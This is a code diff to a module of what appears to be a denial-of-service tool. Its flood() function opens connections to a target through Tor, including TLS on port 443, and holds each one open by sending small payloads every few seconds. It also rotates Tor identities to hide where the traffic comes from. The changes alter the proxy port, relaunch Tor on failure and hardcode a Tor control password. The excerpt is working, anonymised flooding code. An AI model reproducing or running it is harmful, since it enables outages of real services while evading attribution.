@@ -22,9 +22,8 @@ SOFTWARE.
 
 '''
 
-import time, socket, ssl
+import time, ssl
 from python_socks.sync import Proxy
-from python_socks._errors import ProxyTimeoutError, ProxyConnectionError
 from random import uniform
 from urllib.parse import urlparse
 from stem import Signal
@@ -39,7 +38,7 @@ def new_identity() -> None:
     '''
 
     with Controller.from_port(port=9052) as controller:
-        controller.authenticate()
+        controller.authenticate(password='cerberus')
         controller.signal(Signal.NEWNYM)
 
 def flood(attack_id, url, stoptime) -> None:
@@ -49,7 +48,6 @@ def flood(attack_id, url, stoptime) -> None:
     
     if not Core.is_tor_active: # TOR dead? (re)launch it
         utils().launch_tor()
-        Core.is_tor_active = True
 
     socket = None
     while time.time() < stoptime and not Core.killattack:
@@ -64,8 +62,11 @@ def flood(attack_id, url, stoptime) -> None:
         try:
 
             if not socket:
-                proxy = Proxy.from_url('socks5://127.0.0.1:9050')
-                socket = proxy.connect(Core.target_host, Core.target_port) # connect
+                try:
+                    proxy = Proxy.from_url('socks5://127.0.0.1:9049') # set the proxy to the port in "src/files/Tor/torrc"
+                    socket = proxy.connect(Core.target_host, Core.target_port) # connect
+                except Exception:
+                    utils().launch_tor() # launch tor
 
                 if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
                     socket = ssl.create_default_context().wrap_socket(
@@ -81,7 +82,6 @@ def flood(attack_id, url, stoptime) -> None:
                 Core.infodict[attack_id]['req_sent'] += 1
                 time.sleep(uniform(3,6))
             except Exception: #as e:
-                #print(f' - Failed to send tiny byte of data, closing connection: {str(e).rstrip()}')
                 socket.close() # close connection
                 socket = None # reset the socket variable
 
@@ -92,7 +92,6 @@ def flood(attack_id, url, stoptime) -> None:
         Core.change_identity += 1
 
     socket.close() # close the socket, incase it was still open
-
     Core.threadcount -= 1
 
 Core.methods.update({
